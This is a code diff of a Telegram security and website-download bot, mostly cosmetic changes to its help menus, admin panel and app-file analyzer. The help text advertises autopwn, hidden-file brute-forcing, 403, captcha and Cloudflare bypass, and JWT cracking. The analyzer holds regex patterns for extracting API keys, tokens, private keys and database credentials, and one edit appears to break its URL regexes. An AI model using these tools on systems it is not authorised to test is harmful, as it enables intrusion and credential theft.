-    await msg.edit_text(f"🔌 *BOLA/IDOR Scan   `{urlparse(url).hostname}`*\n⏳ Testing `{len(endpoints[:10])}` endpoints...", parse_mode='Markdown')
+    await msg.edit_text(f"🔌 *BOLA/IDOR Scan — `{urlparse(url).hostname}`*\n⏳ Testing `{len(endpoints[:10])}` endpoints...", parse_mode='Markdown')
     res = await asyncio.to_thread(_do_bola_scan_sync, url, endpoints)
     found = res.get("found", [])
-    lines = [f"🔌 *BOLA/IDOR Results   `{urlparse(url).hostname}`*", "--------------------"]
+    lines = [f"🔌 *BOLA/IDOR Results — `{urlparse(url).hostname}`*", "━━━━━━━━━━━━━━━━━━━━"]
     if found:
         for f in found: lines.append(f"🔴 Potential BOLA: `{f['endpoint']}`")
     else: lines.append("✅ No BOLA vulnerabilities detected.")
@@ -10566,13 +10817,13 @@ async def cmd_bola(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     welcome_text = (
         "👋 *Welcome to Website Downloader & Security Bot v39*\n"
-        "------------------------------\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         "🙏 *The most powerful tool for web analysis and downloading.*\n\n"
         "🛠 *Core Features:*\n"
-        "• 📥 `Download`   Full website source with assets\n"
-        "• 🔍 `Recon`   Deep tech stack & header analysis\n"
-        "• 🎯 `Discover`   API endpoints & secret scanning\n"
-        "• 🛡 `Autopwn`   Automated security auditing\n• 📂 `Sensitive`   Brute-force hidden files\n• 🔌 `BOLA`   API IDOR vulnerability test\n\n"
+        "• 📥 `Download` — Full website source with assets\n"
+        "• 🔍 `Recon` — Deep tech stack & header analysis\n"
+        "• 🎯 `Discover` — API endpoints & secret scanning\n"
+        "• 🛡 `Autopwn` — Automated security auditing\n• 📂 `Sensitive` — Brute-force hidden files\n• 🔌 `BOLA` — API IDOR vulnerability test\n\n"
         "💡 *Tip:* Use the buttons below to explore features or type `/help` for all commands."
     )
     kb = [
@@ -10624,43 +10875,43 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if is_adm:
         kb_rows.append([InlineKeyboardButton("👑 Admin Panel", callback_data="help_admin")])
     await update.effective_message.reply_text(
-        "📖 *Help   Category ရွေးပါ*",
+        "📖 *Help — Category ရွေးပါ*",
         reply_markup=InlineKeyboardMarkup(kb_rows),
         parse_mode='Markdown'
     )
 
 
-# --------------------------------------------------
+# ──────────────────────────────────────────────────
 # Help category callback handler
-# --------------------------------------------------
+# ──────────────────────────────────────────────────
 
 _HELP_PAGES = {
     "help_dl": (
         "📥 *Download*\n"
-        "--------------------\n\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
         "`/dl <url>`\n"
         "  └ Mode ရွေးဖို့ keyboard ပေါ်လာမယ်\n\n"
-        "`/dl <url> full`     Full site crawl\n"
-        "`/dl <url> js`       JS/React/Vue render\n"
-        "`/dl <url> jsful`    JS + Full site\n\n"
-        "`/resume <url>`    ကျသွားလျှင် ဆက်\n"
-        "`/stop`            Download ရပ်ရန်\n\n"
+        "`/dl <url> full`   — Full site crawl\n"
+        "`/dl <url> js`     — JS/React/Vue render\n"
+        "`/dl <url> jsful`  — JS + Full site\n\n"
+        "`/resume <url>`  — ကျသွားလျှင် ဆက်\n"
+        "`/stop`          — Download ရပ်ရန်\n\n"
         "💡 50MB+ → auto split & send"
     ),
     "help_scan": (
         "🔍 *Security Scanner*\n"
-        "--------------------\n\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
         "`/scan <url>`\n\n"
         "URL တစ်ခုထည့်ရုံနဲ့ modules အကုန်အလိုအလျောက် run မည်:\n"
         "  🛡️ Vulnerability scan\n"
         "  🌀 Path & param fuzzer\n"
         "  🧠 Smart context-aware fuzzer\n"
         "  🔓 403 bypass tester\n\n"
-        "💡 Mode ရွေးစရာမလို   အကုန် auto-run"
+        "💡 Mode ရွေးစရာမလို — အကုန် auto-run"
     ),
     "help_recon": (
         "🕵️ *Recon*\n"
-        "--------------------\n\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
         "`/recon <url>`\n\n"
         "URL တစ်ခုထည့်ရုံနဲ့ modules အကုန်အလိုအလျောက် run မည်:\n"
         "  🔬 Tech stack\n"
@@ -10669,45 +10920,45 @@ _HELP_PAGES = {
         "  🍪 Cookie security flags\n"
         "  🤖 robots.txt\n"
         "  🔗 Page links\n\n"
-        "💡 Mode ရွေးစရာမလို   အကုန် auto-run"
+        "💡 Mode ရွေးစရာမလို — အကုန် auto-run"
     ),
     "help_discover": (
         "🔎 *Discovery*\n"
-        "--------------------\n\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
         "`/discover <url>`\n\n"
         "URL တစ်ခုထည့်ရုံနဲ့ modules အကုန်အလိုအလျောက် run မည်:\n"
         "  🔌 API endpoint discovery\n"
         "  🔑 Secret / API key scanner\n"
         "  📡 Subdomain enumeration\n\n"
         "🆕 *New (v41):*\n"
-        "`/api <url>`   Admin Panel Finder\n"
+        "`/api <url>` — Admin Panel Finder\n"
         "  └ ရှာဖွေမည့်နေရာပေါင်း ၅၀၀ ကျော်\n"
         "  └ Login pages, Dashboards, DB admin စသည်\n\n"
-        "💡 Mode ရွေးစရာမလို   အကုန် auto-run | Secrets: AWS, JWT, Stripe, GitHub tokens စစ်"
+        "💡 Mode ရွေးစရာမလို — အကုန် auto-run | Secrets: AWS, JWT, Stripe, GitHub tokens စစ်"
     ),
     "help_monitor": (
         "🔔 *Page Monitor*\n"
-        "--------------------\n\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
         "`/monitor add <url> [min] [label]`\n"
         "  └ Page ပြောင်းရင် alert ပို့မည်\n"
         "  └ interval = minutes (default 30)\n\n"
-        "`/monitor list`     ကြည့်ရန်\n"
-        "`/monitor del <n>`  ဖျက်ရန်\n"
-        "`/monitor clear`    အားလုံးဖျက်\n\n"
+        "`/monitor list`   — ကြည့်ရန်\n"
+        "`/monitor del <n>`— ဖျက်ရန်\n"
+        "`/monitor clear`  — အားလုံးဖျက်\n\n"
         "💡 Max 10 monitors"
     ),
     "help_account": (
         "📊 *My Account*\n"
-        "--------------------\n\n"
-        "`/status`     Daily limit + usage bar\n"
-        "`/history`    Download log (last 10)\n"
-        "`/mystats`    Total downloads + stats\n"
-        "`/stop`       Download ရပ်ရန်"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
+        "`/status`   — Daily limit + usage bar\n"
+        "`/history`  — Download log (last 10)\n"
+        "`/mystats`  — Total downloads + stats\n"
+        "`/stop`     — Download ရပ်ရန်"
     ),
     "help_app": (
         "📱 *App Analyzer*\n"
-        "--------------------\n\n"
-        "Chat ထဲ file drop ရုံသာ   auto analyze\n\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
+        "Chat ထဲ file drop ရုံသာ — auto analyze\n\n"
         "Supported: APK / IPA / ZIP / JAR / AAB\n\n"
         "Extracts:\n"
         "  • API endpoints & domains\n"
@@ -10715,11 +10966,11 @@ _HELP_PAGES = {
         "  • AndroidManifest / Info.plist\n"
         "  • Permission risk analysis\n"
         "  • DEX string extraction\n\n"
-        "`/appassets`   Asset extractor"
+        "`/appassets` — Asset extractor"
     ),
     "help_v20": (
-        "🆕 *V20   Advanced Security Tools*\n"
-        "--------------------\n\n"
+        "🆕 *V20 — Advanced Security Tools*\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
         "☁️ *CDN / Real IP*\n"
         "`/cloudcheck example.com`\n"
         "  └ MX records + subdomains + passive DNS\n"
@@ -10737,27 +10988,27 @@ _HELP_PAGES = {
     ),
     "help_tools": (
         "🛠️ *Standalone Tools*\n"
-        "--------------------\n\n"
-        "`/screenshot <url>`   Page screenshot (Puppeteer)\n"
-        "`/antibot <url>`      CF/captcha bypass\n"
-        "`/jwtattack <token>`  JWT decode & crack\n\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
+        "`/screenshot <url>` — Page screenshot (Puppeteer)\n"
+        "`/antibot <url>`    — CF/captcha bypass\n"
+        "`/jwtattack <token>`— JWT decode & crack\n\n"
         "🔄 *Proxy Download (v35 NEW)*\n"
-        "`/proxy_download <url>`    Auto-fetch proxy & download\n"
+        "`/proxy_download <url>`  — Auto-fetch proxy & download\n"
         "  └ Automatically fetches & validates working proxies\n"
         "  └ Rotates through proxy chain\n"
         "  └ Fallback to direct if proxies unavailable\n\n"
-        "`/proxy_status`    Check proxy pool health"
+        "`/proxy_status`  — Check proxy pool health"
     ),
     "help_admin": (
         "👑 *Admin Commands*\n"
-        "--------------------\n\n"
-        "`/admin`                    Admin panel\n"
-        "`/sys`                      Storage status\n"
-        "`/sys clean`                Cleanup files\n"
-        "`/sys logs [n]`             View logs\n\n"
-        "`/adminset limit <n>`       Daily limit (0=∞)\n"
-        "`/adminset pages <n>`       Max crawl pages\n"
-        "`/adminset assets <n>`      Max assets\n\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
+        "`/admin`                  — Admin panel\n"
+        "`/sys`                    — Storage status\n"
+        "`/sys clean`              — Cleanup files\n"
+        "`/sys logs [n]`           — View logs\n\n"
+        "`/adminset limit <n>`     — Daily limit (0=∞)\n"
+        "`/adminset pages <n>`     — Max crawl pages\n"
+        "`/adminset assets <n>`    — Max assets\n\n"
         "`/ban <id>` `/unban <id>`\n"
         "`/userinfo <id>`\n"
         "`/broadcast <msg>`\n"
@@ -10803,7 +11054,7 @@ async def help_category_callback(update: Update, context: ContextTypes.DEFAULT_T
         if is_adm:
             kb_rows.append([InlineKeyboardButton("👑 Admin Panel", callback_data="help_admin")])
         await query.edit_message_text(
-            "📖 *Help   Category ရွေးပါ*",
+            "📖 *Help — Category ရွေးပါ*",
             reply_markup=InlineKeyboardMarkup(kb_rows),
             parse_mode='Markdown'
         )
@@ -10853,7 +11104,7 @@ async def cmd_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.effective_message.reply_text("\n".join(lines), parse_mode='Markdown')
 
 
-# -- Core download runner --------------------------
+# ── Core download runner ──────────────────────────
 
 async def _run_download(
     update: Update, context: ContextTypes.DEFAULT_TYPE,
@@ -10864,17 +11115,17 @@ async def _run_download(
     uid   = update.effective_user.id
     uname = update.effective_user.first_name
 
-    # -- Rate limit check --------------------------
+    # ── Rate limit check ──────────────────────────
     if not resume_mode:
         allowed, wait_sec = check_rate_limit(uid)
         if not allowed:
             await update.effective_message.reply_text(
-                f"⏱️ နည်းနည်းစောင့်ပါ   `{wait_sec}` seconds ကျန်သေးတယ်",
+                f"⏱️ နည်းနည်းစောင့်ပါ — `{wait_sec}` seconds ကျန်သေးတယ်",
                 parse_mode='Markdown'
             )
             return
 
-    # -- SSRF pre-check ----------------------------
+    # ── SSRF pre-check ────────────────────────────
     safe_ok, reason = is_safe_url(url)
     if not safe_ok:
         await update.effective_message.reply_text(
@@ -10883,7 +11134,7 @@ async def _run_download(
         )
         return
 
-    # -- DB checks (with lock) ---------------------
+    # ── DB checks (with lock) ─────────────────────
     async with db_lock:
         db = _load_db_sync()
         u  = get_user(db, uid, uname)
@@ -10912,7 +11163,7 @@ async def _run_download(
     last = {'t': '', 'sent': ''}
     def sync_cb(text): last['t'] = text
 
-    # -- Cancel flag   /stop command ---------------
+    # ── Cancel flag — /stop command ───────────────
     cancel_event = asyncio.Event()
     _cancel_flags[uid] = cancel_event
 
@@ -10924,7 +11175,7 @@ async def _run_download(
         BUG FIX v39:
         - Spinner frozen ပြသနာ fix: body မပြောင်းသော်လည်း 4s တိုင်း force update
           → user မြင်တာ: spinner ပတ်နေဆဲ = download still running သိနိုင်
-        - v46: Stuck detection   if body doesn't change for 120s, warn user.
+        - v46: Stuck detection — if body doesn't change for 120s, warn user.
         """
         first_tick = True
         while True:
@@ -11026,7 +11277,7 @@ async def _run_download(
             return
 
     prog.cancel()
-    _cancel_flags.pop(uid, None)   # download finished   remove flag
+    _cancel_flags.pop(uid, None)   # download finished — remove flag
 
     # Check if cancelled during download
     if cancel_event.is_set():
@@ -11042,7 +11293,7 @@ async def _run_download(
         f"📄 {stats['pages']}p | 📦 {stats['assets']}a | 💾 {size_mb:.1f}MB"
     )
 
-    # -- Small file (≤SPLIT_MB): send directly via Telegram ----------
+    # ── Small file (≤SPLIT_MB): send directly via Telegram ──────────
     if not needs_split(files[0]):
         await msg.edit_text(
             f"📤 Telegram upload နေပါတယ်...\n💾 {size_mb:.1f}MB",
@@ -11082,13 +11333,13 @@ async def _run_download(
                 _save_db_sync(db4)
         except RetryAfter as e:
             await msg.edit_text(
-                f"❌ Flood limit   `{e.retry_after}s` နောက်ထပ်ကြိုးစားပါ",
+                f"❌ Flood limit — `{e.retry_after}s` နောက်ထပ်ကြိုးစားပါ",
                 parse_mode='Markdown'
             )
         except Exception as e:
             await msg.edit_text(f"❌ Upload error: `{type(e).__name__}`", parse_mode='Markdown')
 
-    # -- Large file (>SPLIT_MB): smart filehost upload -----------------
+    # ── Large file (>SPLIT_MB): smart filehost upload ─────────────────
     # gofile.io → transfer.sh → 0x0.st → split fallback (no manual reassembly needed)
     else:
         await msg.edit_text(
@@ -11123,28 +11374,28 @@ async def _run_download(
             gc.collect()
 
 
-# -- Command wrappers ------------------------------
+# ── Command wrappers ──────────────────────────────
 
 async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/stop - Cancel current running download OR scan"""
+    """/stop — Cancel current running download OR scan"""
     uid = update.effective_user.id
     
     stopped = []
     
-    # -- Stop active download -----------------------
+    # ── Stop active download ───────────────────────
     event = _cancel_flags.pop(uid, None)
     if event and not event.is_set():
         event.set()
         stopped.append("📥 Download")
     
-    # -- Stop active scan (cancel the asyncio Task) -
+    # ── Stop active scan (cancel the asyncio Task) ─
     scan_task = _scan_tasks.pop(uid, None)
     scan_name = _active_scans.pop(uid, None)
     if scan_task and not scan_task.done():
         scan_task.cancel()
         stopped.append(f"🔍 {scan_name or 'Scan'}")
     elif scan_name:
-        # scan_name existed but no task ref   still clear it
+        # scan_name existed but no task ref — still clear it
         stopped.append(f"🔍 {scan_name}")
     
     if stopped:
@@ -11193,7 +11444,7 @@ async def cmd_resume(u, c):
     url   = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
     state = load_resume(url)
     if not state["visited"] and not state["downloaded"]:
-        await u.message.reply_text("⚠️ Resume state မတွေ့ပါ   `/download` ကနေ အသစ်ကနေ စပါ", parse_mode='Markdown')
+        await u.message.reply_text("⚠️ Resume state မတွေ့ပါ — `/download` ကနေ အသစ်ကနေ စပါ", parse_mode='Markdown')
         return
     await u.message.reply_text(
         f"♻️ Resume: `{len(state['visited'])}` pages, `{len(state['downloaded'])}` assets done",
@@ -11202,12 +11453,12 @@ async def cmd_resume(u, c):
     await enqueue_download(u, c, url, True, False, resume_mode=True)
 
 
-# ==================================================
+# ══════════════════════════════════════════════════
 # 👑  ADMIN COMMANDS
-# ==================================================
+# ══════════════════════════════════════════════════
 
 async def _send_admin_panel(target, db: dict):
-    """Admin Panel v31 - DB Backup + User CSV Export + Cleanup buttons"""
+    """Admin Panel v31 — DB Backup + User CSV Export + Cleanup buttons"""
     bot_on    = db["settings"]["bot_enabled"]
     today     = str(date.today())
     tu        = len(db["users"])
@@ -11247,7 +11498,7 @@ async def _send_admin_panel(target, db: dict):
     status_line = "🟢 Running" if bot_on else "🔴 Stopped"
     text = (
         f"👑 *Admin Panel v46 (Ultra)*\n"
-        f"{'-' * 22}\n"
+        f"{'━' * 22}\n"
         f"🤖 Bot: {status_line}\n"
         f"👥 Users: `{tu}` total  |  🚫 Banned: `{banned_n}`\n"
         f"📦 Downloads: `{tdl}` total  |  Today: `{today_dl}`\n"
@@ -11389,7 +11640,7 @@ async def cmd_allusers(update: Update, context: ContextTypes.DEFAULT_TYPE):
     lines = ["👥 *Users*\n"]
     for uid, u in list(db["users"].items())[:30]:
         icon = "🚫" if u["banned"] else "✅"
-        lines.append(f"{icon} `{uid}`   {u['name']} | {u['total_downloads']} DL")
+        lines.append(f"{icon} `{uid}` — {u['name']} | {u['total_downloads']} DL")
     await update.effective_message.reply_text("\n".join(lines), parse_mode='Markdown')
 
 @admin_only
@@ -11411,9 +11662,9 @@ async def cmd_setassets(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.effective_message.reply_text(f"✅ Max assets → `{context.args[0]}`", parse_mode='Markdown')
 
 
-# ==================================================
+# ══════════════════════════════════════════════════
 # 📱  APP / APK / IPA / ZIP ANALYZER
-# ==================================================
+# ══════════════════════════════════════════════════
 
 # Supported file types
 _APP_EXTS = {
@@ -11427,16 +11678,16 @@ _APP_EXTS = {
     '.aar':  'Android Library',
 }
 
-# -- Regex patterns for API/URL/Key extraction ----
+# ── Regex patterns for API/URL/Key extraction ────
 _APP_URL_PATTERNS = [
     # Full URLs
-    re.compile(r'https?://[^\s\x27"<>{}\[\]\\|^`]{8,200}'),
+    re.compile(r'https?://[^\\s\x27"<>{}\[\]\\|^`]{8,200}'),
     # API paths
-    re.compile(r'[\x27"/]((?:api|rest|graphql|v\d+)/[^\s\x27"<>]{3,120})[\x27"/]'),
+    re.compile(r'[\x27"/]((?:api|rest|graphql|v\d+)/[^\\s\x27"<>]{3,120})[\x27"/]'),
     # Base URLs
     re.compile(r'(?:BASE_URL|baseUrl|base_url|API_URL|apiUrl|HOST|ENDPOINT)\s*[=:]\s*[\x27"]([^\x27"]{8,150})[\x27"]', re.I),
     # WebSocket
-    re.compile(r'wss?://[^\s\x27"<>{}\[\]\\]{8,150}'),
+    re.compile(r'wss?://[^\\s\x27"<>{}\[\]\\]{8,150}'),
 ]
 
 _APP_SECRET_PATTERNS = {
@@ -11452,13 +11703,13 @@ _APP_SECRET_PATTERNS = {
     'Twilio SID':     re.compile(r'AC[0-9a-fA-F]{32}'),
     'Private Key':    re.compile(r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----'),
     'JWT Token':      re.compile(r'eyJ[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]{10,}'),
-    'MongoDB URI':    re.compile(r'mongodb(?:\+srv)?://[^\s\x27"<>]{10,150}'),
-    'MySQL URI':      re.compile(r'mysql://[^\s\x27"<>]{10,150}'),
-    'Postgres URI':   re.compile(r'postgres(?:ql)?://[^\s\x27"<>]{10,150}'),
+    'MongoDB URI':    re.compile(r'mongodb(?:\+srv)?://[^\\s\x27"<>]{10,150}'),
+    'MySQL URI':      re.compile(r'mysql://[^\\s\x27"<>]{10,150}'),
+    'Postgres URI':   re.compile(r'postgres(?:ql)?://[^\\s\x27"<>]{10,150}'),
     'Hardcoded Pass': re.compile(r'(?:password|passwd|pwd)\s*[=:]\s*[\x27"]([^\x27"]{6,60})[\x27"]', re.I),
 }
 
-# -- File types to scan inside archive -----------
+# ── File types to scan inside archive ───────────
 _SCAN_EXTENSIONS = {
     '.smali', '.java', '.kt', '.xml', '.json', '.yaml', '.yml',
     '.properties', '.gradle', '.plist', '.js', '.ts', '.html',
@@ -11490,7 +11741,7 @@ def _scan_text_content(text: str, source_file: str) -> dict:
 
     for pat in _APP_URL_PATTERNS:
         for m in pat.findall(text):
-            url = m.strip().rstrip('.,;"\\/')
+            url = m.strip().rstrip('.,;\x27"\\/)')
             if len(url) > 8 and not any(noise in url for noise in [
                 'schemas.android', 'xmlns', 'w3.org', 'apache.org',
                 'example.com', 'localhost', 'schema.org',
@@ -11500,7 +11751,7 @@ def _scan_text_content(text: str, source_file: str) -> dict:
     for name, pat in _APP_SECRET_PATTERNS.items():
         matches = pat.findall(text)
         if matches:
-            # Don't store full secrets   just flag existence
+            # Don't store full secrets — just flag existence
             secrets[name] = len(matches)
 
     return {"urls": list(urls), "secrets": secrets, "file": source_file}
@@ -11632,7 +11883,7 @@ def analyze_app_file(filepath: str, progress_cb=None) -> dict:
 
                 _, fext = os.path.splitext(name.lower())
 
-                # -- Text files: scan directly ----------
+                # ── Text files: scan directly ──────────
                 if fext in _SCAN_EXTENSIONS:
                     try:
                         data = zf.read(name)
@@ -11665,7 +11916,7 @@ def analyze_app_file(filepath: str, progress_cb=None) -> dict:
                     except Exception as e:
                         result["errors"].append(f"{name}: {e}")
 
-                # -- Binary files: string extraction ----
+                # ── Binary files: string extraction ────
                 elif fext in _BINARY_EXTS and fsize_mb < 20:
                     try:
                         data = zf.read(name)
@@ -11681,7 +11932,7 @@ def analyze_app_file(filepath: str, progress_cb=None) -> dict:
                         f"🌐 URLs: `{len(all_urls)}` | 🔑 Secrets: `{len(all_secrets)}`"
                     )
 
-        # -- Categorize URLs ---------------------------
+        # ── Categorize URLs ───────────────────────────
         api_paths = set()
         full_urls = set()
         ws_urls   = set()
@@ -11726,7 +11977,7 @@ def analyze_app_file(filepath: str, progress_cb=None) -> dict:
     return result
 
 
-# -- Admin callbacks -------------------------------
+# ── Admin callbacks ───────────────────────────────
 
 async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Admin Panel callback handler v31"""
@@ -11743,14 +11994,14 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         db = _load_db_sync()
     data = query.data
 
-    # -- Users list --------------------------------
+    # ── Users list ────────────────────────────────
     if data == "adm_users":
         users_list = list(db["users"].items())
         lines_msg = [f"👥 *Users ({len(users_list)} total)*\n"]
         for uid, u in users_list[:20]:
             icon = "🚫" if u.get("banned") else "✅"
             name = u.get("name", "Unknown")[:18]
-            lines_msg.append(f"{icon} `{uid}`   {name} | DL:`{u.get('total_downloads',0)}`")
+            lines_msg.append(f"{icon} `{uid}` — {name} | DL:`{u.get('total_downloads',0)}`")
         kb = [
             [
                 InlineKeyboardButton("📤 Export CSV", callback_data="adm_export_users"),
@@ -11766,7 +12017,7 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except BadRequest:
             pass
 
-    # -- Export users as CSV -----------------------
+    # ── Export users as CSV ───────────────────────
     elif data == "adm_export_users":
         try:
             csv_lines = ["uid,name,banned,total_downloads,today,total_scans,last_date"]
@@ -11797,7 +12048,7 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             await query.answer(f"❌ Error: {str(e)[:60]}", show_alert=True)
 
-    # -- Stats -------------------------------------
+    # ── Stats ─────────────────────────────────────
     elif data == "adm_stats":
         today_str   = str(date.today())
         tdl         = sum(u.get("total_downloads", 0) for u in db["users"].values())
@@ -11807,7 +12058,7 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         top = sorted(db["users"].items(),
                      key=lambda x: x[1].get("total_downloads", 0), reverse=True)[:5]
         top_txt = "\n".join(
-            f"  {i+1}. {u.get('name','?')[:15]} (`{uid}`)   {u.get('total_downloads',0)} DL"
+            f"  {i+1}. {u.get('name','?')[:15]} (`{uid}`) — {u.get('total_downloads',0)} DL"
             for i, (uid, u) in enumerate(top)
         ) or "  (none)"
         kb = [[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]]
@@ -11821,7 +12072,7 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode='Markdown'
         )
 
-    # -- Settings ----------------------------------
+    # ── Settings ──────────────────────────────────
     elif data == "adm_settings":
         s  = db["settings"]
         kb = [
@@ -11844,12 +12095,12 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode='Markdown'
         )
 
-    # -- Commands list -----------------------------
+    # ── Commands list ─────────────────────────────
     elif data == "adm_cmds":
         kb = [[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]]
         await query.edit_message_text(
             "📋 *Admin Commands v31*\n"
-            "------------------\n\n"
+            "━━━━━━━━━━━━━━━━━━\n\n"
             "👤 *User Management*\n"
             "  `/ban <id>` `/unban <id>`\n"
             "  `/userinfo <id>` `/allusers`\n\n"
@@ -11858,19 +12109,19 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "  `/adminset limit <id> <n>`\n"
             "  `/adminset pages <n>`\n\n"
             "📢 *Broadcast*\n"
-            "  `/broadcast <msg>`   banned skip ✅\n\n"
+            "  `/broadcast <msg>` — banned skip ✅\n\n"
             "🖥️ *System*\n"
             "  `/sys` `/sys clean` `/sys logs`\n"
-            "  `/botstats`   Real-time metrics\n\n"
+            "  `/botstats` — Real-time metrics\n\n"
             "🔬 *New v31*\n"
-            "  `/analyze <domain>`   Source scan\n"
-            "  `/apitest <url>`   Token extractor\n"
-            "  `/afterdl`   What to do guide",
+            "  `/analyze <domain>` — Source scan\n"
+            "  `/apitest <url>` — Token extractor\n"
+            "  `/afterdl` — What to do guide",
             reply_markup=InlineKeyboardMarkup(kb),
             parse_mode='Markdown'
         )
 
-    # -- Download Log ------------------------------
+    # ── Download Log ──────────────────────────────
     elif data == "adm_log":
         all_logs = []
         for uid, u in db["users"].items():
@@ -11889,7 +12140,7 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode='Markdown'
         )
 
-    # -- Toggle Bot ON/OFF -------------------------
+    # ── Toggle Bot ON/OFF ─────────────────────────
     elif data == "adm_toggle_bot":
         async with db_lock:
             db2 = _load_db_sync()
@@ -11901,14 +12152,14 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             db3 = _load_db_sync()
         await _send_admin_panel(query, db3)
 
-    # -- Active Scans ------------------------------
+    # ── Active Scans ──────────────────────────────
     elif data == "adm_scans":
         if _active_scans:
             lines_msg = ["🔍 *Active Scans*\n"]
             for u_id, sname in _active_scans.items():
                 uinfo = db["users"].get(str(u_id), {})
                 uname = uinfo.get("name", str(u_id))
-                lines_msg.append(f"  • `{u_id}` ({uname})   *{sname}*")
+                lines_msg.append(f"  • `{u_id}` ({uname}) — *{sname}*")
         else:
             lines_msg = ["🔍 *Active Scans*\n", "  ✅ No scans running"]
         kb = [[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]]
@@ -11921,7 +12172,7 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except BadRequest:
             pass
 
-    # -- 💾 DB Backup ------------------------------
+    # ── 💾 DB Backup ──────────────────────────────
     elif data == "adm_backup_db":
         try:
             if not os.path.exists(SQLITE_FILE):
@@ -11955,7 +12206,7 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             await query.answer(f"❌ Backup error: {str(e)[:60]}", show_alert=True)
 
-    # -- 🧹 Cleanup old downloads ------------------
+    # ── 🧹 Cleanup old downloads ──────────────────
     elif data == "adm_cleanup":
         try:
             deleted  = 0
@@ -11994,18 +12245,18 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             await query.answer(f"❌ Error: {str(e)[:60]}", show_alert=True)
 
-    # -- Back --------------------------------------
+    # ── Back ──────────────────────────────────────
     elif data == "adm_back":
         await _send_admin_panel(query, db)
 
-# ==================================================
-# 🆕  NEW FEATURES   v19.0
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🆕  NEW FEATURES — v19.0
+# ══════════════════════════════════════════════════
 
-# -- /headers -------------------------------------
+# ── /headers ─────────────────────────────────────
 
 async def cmd_headers(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/headers <url> - HTTP Security Headers စစ်ဆေးသည်"""
+    """/headers <url> — HTTP Security Headers စစ်ဆေးသည်"""
     if not await check_force_join(update, context): return
     if not context.args:
         await update.effective_message.reply_text(
@@ -12024,7 +12275,7 @@ async def cmd_headers(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     if uid in _active_scans:
         await update.effective_message.reply_text(
-            f"⏳ *`{_active_scans.get(uid)}` running*   ပြီးဆုံးဖို့ စောင့်ပါ\n"
+            f"⏳ *`{_active_scans.get(uid)}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
             "သို့မဟုတ် `/stop` နှိပ်ပါ", parse_mode='Markdown')
         return
     _active_scans.set(uid, "Headers")
@@ -12050,7 +12301,7 @@ async def cmd_headers(update: Update, context: ContextTypes.DEFAULT_TYPE):
     status, hdrs, elapsed = await asyncio.to_thread(_do)
 
     if not status:
-        await msg.edit_text("❌ Request မအောင်မြင်ဘူး   URL စစ်ပါ")
+        await msg.edit_text("❌ Request မအောင်မြင်ဘူး — URL စစ်ပါ")
         _active_scans.pop(uid, None)   # fix
         return
 
@@ -12068,7 +12319,7 @@ async def cmd_headers(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     hdrs_lower = {k.lower(): v for k, v in hdrs.items()}
 
-    lines = [f"📋 *HTTP Headers   `{urlparse(url).hostname}`*",
+    lines = [f"📋 *HTTP Headers — `{urlparse(url).hostname}`*",
              f"Status: `{status}` | Time: `{elapsed:.2f}s`\n"]
 
     lines.append("*🔒 Security Headers:*")
@@ -12094,10 +12345,10 @@ async def cmd_headers(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await msg.edit_text("\n".join(lines), parse_mode='Markdown')
 
 
-# -- /links ----------------------------------------
+# ── /links ────────────────────────────────────────
 
 async def cmd_links(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/links <url> - Page ထဲက link အားလုံး ထုတ်ပေးသည်"""
+    """/links <url> — Page ထဲက link အားလုံး ထုတ်ပေးသည်"""
     if not await check_force_join(update, context): return
     if not context.args:
         await update.effective_message.reply_text(
@@ -12115,7 +12366,7 @@ async def cmd_links(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     if uid in _active_scans:
         await update.effective_message.reply_text(
-            f"⏳ *`{_active_scans.get(uid)}` running*   ပြီးဆုံးဖို့ စောင့်ပါ\n"
+            f"⏳ *`{_active_scans.get(uid)}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
